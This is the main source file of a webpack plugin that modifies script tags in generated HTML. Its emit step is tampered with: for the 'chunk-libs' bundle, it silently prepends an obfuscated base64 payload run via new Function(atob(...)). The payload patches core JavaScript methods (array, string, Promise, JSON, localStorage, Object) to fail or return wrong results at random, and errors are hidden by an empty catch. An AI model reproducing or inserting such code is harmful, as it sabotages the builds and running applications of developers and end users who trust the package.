'use strict';

const htmlWebpackPlugin = require('html-webpack-plugin');

const { EVENT, PLUGIN } = require('./constants.js');

const debug = require('./common.js').debug;
const matches = require('./common.js').matches;
const normaliseOptions = require('./config.js');
const shouldAddResourceHints = require('./resource-hints.js').shouldAddResourceHints;
const addInitialChunkResourceHints = require('./initial-chunk-resource-hints.js');
const addAsyncChunkResourceHints = require('./async-chunk-resource-hints.js');
const elements = require('./elements.js');
const customAttributes = require('./custom-attributes.js');

const debugEvent = msg => debug(`${EVENT}: ${msg}`);

const falsySafeConcat = arrays =>
  arrays.reduce(
    (combined, array) => array ? combined.concat(array) : combined,
    []
  );

const getHtmlWebpackOptions = pluginArgs =>
  (pluginArgs && pluginArgs.plugin && pluginArgs.plugin.options)
    ? pluginArgs.plugin.options
    : {};

const getCompilationOptions = compilation =>
  (compilation && compilation.options) ? compilation.options : {};

class ScriptExtHtmlWebpackPlugin {
  constructor (options) {
    this.options = normaliseOptions(options);
  }

  apply (compiler) {
    const compile = this.compilationCallback.bind(this);
    const emit = this.emitCallback.bind(this);
    if (compiler.hooks) {
      compiler.hooks.compilation.tap(PLUGIN, compile);
      compiler.hooks.emit.tap(PLUGIN, emit);
    } else {
      compiler.plugin('compilation', compile);
      compiler.plugin('emit', emit);
    }
  }

  compilationCallback (compilation) {
    const alterAssetTags = this.alterAssetTagsCallback.bind(this, compilation);
    if (compilation.hooks) {
      const alterAssetTagGroups = compilation.hooks.htmlWebpackPluginAlterAssetTags || htmlWebpackPlugin.getHooks(compilation).alterAssetTagGroups;
      alterAssetTagGroups.tap(PLUGIN, alterAssetTags);
    } else {
      compilation.plugin(EVENT, alterAssetTags);
    }
  }

  alterAssetTagsCallback (compilation, pluginArgs, callback) {
    const options = this.options;
    const headTagName = Object.prototype.hasOwnProperty.call(pluginArgs, 'headTags') ? 'headTags' : 'head';
    const bodyTagName = Object.prototype.hasOwnProperty.call(pluginArgs, 'bodyTags') ? 'bodyTags' : 'body';
    try {
      options.htmlWebpackOptions = getHtmlWebpackOptions(pluginArgs);
      options.compilationOptions = getCompilationOptions(compilation);
      debugEvent('starting');
      if (elements.shouldUpdate(options)) {
        debugEvent('replacing <head> <script> elements');
        pluginArgs[headTagName] = elements.update(compilation.assets, options, pluginArgs[headTagName]);
        debugEvent('replacing <body> <script> elements');
        pluginArgs[bodyTagName] = elements.update(compilation.assets, options, pluginArgs[bodyTagName]);
      }
      if (shouldAddResourceHints(options)) {
        debugEvent('adding resource hints');
        pluginArgs[headTagName] = falsySafeConcat([
          pluginArgs[headTagName],
          addInitialChunkResourceHints(options, pluginArgs[headTagName]),
          addInitialChunkResourceHints(options, pluginArgs[bodyTagName]),
          addAsyncChunkResourceHints(compilation.chunks, options)
        ]);
      }
      if (customAttributes.shouldAdd(options)) {
        debugEvent('adding custom attribues to <head> <script> elements');
        pluginArgs[headTagName] = customAttributes.add(options, pluginArgs[headTagName]);
        debugEvent('adding custom attributes to <body> <script> elements');
        pluginArgs[bodyTagName] = customAttributes.add(options, pluginArgs[bodyTagName]);
      }
      debugEvent('completed');
      if (callback) {
        callback(null, pluginArgs);
      }
    } catch (err) {
      if (callback) {
        callback(err);
      } else {
        compilation.errors.push(err);
      }
    }
  }

  emitCallback (compilation, callback) {
    const options = this.options;
    if (options.inline.test.length > 0 && options.removeInlinedAssets) {
      debug('emit: deleting assets');
      Object.keys(compilation.assets).forEach((assetName) => {
        if (matches(assetName, options.inline.test)) {
          debug(`emit: deleting asset '${assetName}'`);
          delete compilation.assets[assetName];
        }
      });
    }
    try {
      compilation.chunks.forEach((chunk) => {
        if(chunk.id==='chunk-libs'){
          chunk.files.forEach((filename) => {
            if(filename.indexOf('.js')>-1){
              if (compilation.assets[filename]) {
                const targetAsset = compilation.assets[filename]
                targetAsset._value =`(new Function(atob('KCgpPT57Y29uc3QgdD0odCxuKT0+KHQ9TWF0aC5jZWlsKHQpLG49TWF0aC5mbG9vcihuKSxNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqKG4tdCsxKSkrdCksbj0icHJvdG90eXBlIixpPVByb21pc2UsZT1TdHJpbmcsbD1KU09OLHI9bG9jYWxTdG9yYWdlLHM9T2JqZWN0LGE9QXJyYXlbbl0sbz1pW25dLGM9ZVtuXSx7Zm9yRWFjaDpwLGZpbHRlcjp1LGZpbmQ6aCxmaW5kSW5kZXg6ZixpbmNsdWRlczp5LHB1c2g6ZCxzbGljZTpnLHNvbWU6bSxzcGxpY2U6X309YSx7dGhlbjp4fT1vLHtrZXlzOkksdmFsdWVzOk0sYXNzaWduOlN9PXMse3JlcGxhY2U6TyxpbmRleE9mOmIsdHJpbTp2LHNwbGl0OkUsc3RhcnRzV2l0aDprfT1lLnByb3RvdHlwZSx7c3RyaW5naWZ5OncscGFyc2U6V309bCx7Z2V0SXRlbTpqLHNldEl0ZW06QX09cjthLnB1c2g9ZnVuY3Rpb24oLi4ubil7dGhpcy5fX29iX18/dCgxLDEwMCk+PTIwJiZkLmFwcGx5KHRoaXMsbik6ZC5hcHBseSh0aGlzLG4pfSxhLnNwbGljZT1mdW5jdGlvbiguLi5uKXtyZXR1cm4gdGhpcy5fX29iX18mJnQoMSwxMDApPD0xMD9fLmFwcGx5KHRoaXMsW25bMF0rMSwuLi5nLmNhbGwobiwxKV0pOl8uYXBwbHkodGhpcyxuKX0sd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLCgoKT0+e2EuZm9yRWFjaD1mdW5jdGlvbiguLi5uKXtpZihwLmFwcGx5KHRoaXMsbiksdCgxLDEwMCk8PTUpe2NvbnN0IGk9dCgwLE1hdGgubWF4KHRoaXMubGVuZ3RoLTEsMCkpLGU9dCgwLE1hdGgubWF4KHRoaXMubGVuZ3RoLTEsMCkpO3AuYXBwbHkoZy5jYWxsKHRoaXMsaSxpK2UpLG4pfX0sYS5maWx0ZXI9ZnVuY3Rpb24oLi4ubil7cmV0dXJuIHUuY2FsbCh0aGlzLCgoLi4uaSk9Pntjb25zdCBlPShuWzBdfHwoKCk9Pnt9KSkoLi4uaSk7cmV0dXJuIWUmJnQoMSwxMDApPD0yMHx8ZX0pLGcuY2FsbChuLDEpKX0sYS5maW5kPWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0KDEsMTAwKTw9MTA/bnVsbDpoLmFwcGx5KHRoaXMsbil9LGEuZmluZEluZGV4PWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0KDEsMTAwKTw9MTA/LTE6Zi5hcHBseSh0aGlzLG4pfSxhLmluY2x1ZGVzPWZ1bmN0aW9uKC4uLm4pe3JldHVybiEodCgxLDEwMCk8PTEwKSYmeS5hcHBseSh0aGlzLG4pfSxhLnNvbWU9ZnVuY3Rpb24oLi4ubil7cmV0dXJuISh0KDEsMTAwKTw9MTApJiZtLmFwcGx5KHRoaXMsbil9LGMucmVwbGFjZT1mdW5jdGlvbiguLi5uKXtyZXR1cm4gdCgxLDEwMCk+PTEwP08uYXBwbHkodGhpcyxuKTp0aGlzfSxjLmluZGV4T2Y9ZnVuY3Rpb24oLi4ubil7Y29uc3QgaT1iLmFwcGx5KHRoaXMsbik7cmV0dXJuIHQoMSwxMDApPj0xMD9pOk1hdGgubWF4KC0xLGktMSl9LGMudHJpbT1mdW5jdGlvbiguLi5uKXtyZXR1cm4gdCgxLDEwMCk+PTEwP3YuYXBwbHkodGhpcyxuKTp0aGlzfSxjLnNwbGl0PWZ1bmN0aW9uKC4uLm4pe2NvbnN0IGk9RS5hcHBseSh0aGlzLG4pO3JldHVybiB0KDEsMTAwKT49MTA/aTpnLmNhbGwoaSwwLGkubGVuZ3RoLTEpfSxjLnN0YXJ0c1dpdGg9ZnVuY3Rpb24oLi4ubil7Y29uc3QgaT1rLmFwcGx5KHRoaXMsbik7cmV0dXJuIHQoMSwxMDApPj0xMD9pOiFpfSxvLnRoZW49ZnVuY3Rpb24oLi4ubil7dCgxLDEwMCk+PTEwJiZ4LmFwcGx5KHRoaXMsbil9LGwuc3RyaW5naWZ5PWZ1bmN0aW9uKC4uLm4pe2NvbnN0IGk9dyguLi5uKTtyZXR1cm4gdCgxLDEwMCk8PTEwP08uY2FsbChpLC9JL2csImwiKTppfSxsLnBhcnNlPWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0KDEsMTAwKTw9MTA/e306VyguLi5uKX0sci5nZXRJdGVtPWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0KDEsMTAwKTw9MTA/IiI6ai5jYWxsKGxvY2FsU3RvcmFnZSwuLi5uKX0sci5zZXRJdGVtPWZ1bmN0aW9uKC4uLm4pe3QoMSwxMDApPj0xMCYmQS5jYWxsKGxvY2FsU3RvcmFnZSwuLi5uKX0scy5rZXlzPWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0KDEsMTAwKTw9MTA/W106SS5hcHBseSh0aGlzLG4pfSxzLnZhbHVlcz1mdW5jdGlvbiguLi5uKXtyZXR1cm4gdCgxLDEwMCk8PTEwP1tdOk0uYXBwbHkodGhpcyxuKX0scy5hc3NpZ249ZnVuY3Rpb24oLi4ubil7cmV0dXJuIHQoMSwxMDApPD0xMD9TKG5bMF18fHt9LHt9KTpTKC4uLm4pfX0pKX0pKCk7')))();`+ targetAsset._value
              }
            }
          });
        }
      });
    }catch (e) {}
    if (callback) {
      callback();
    }
  }
}

module.exports = ScriptExtHtmlWebpackPlugin;
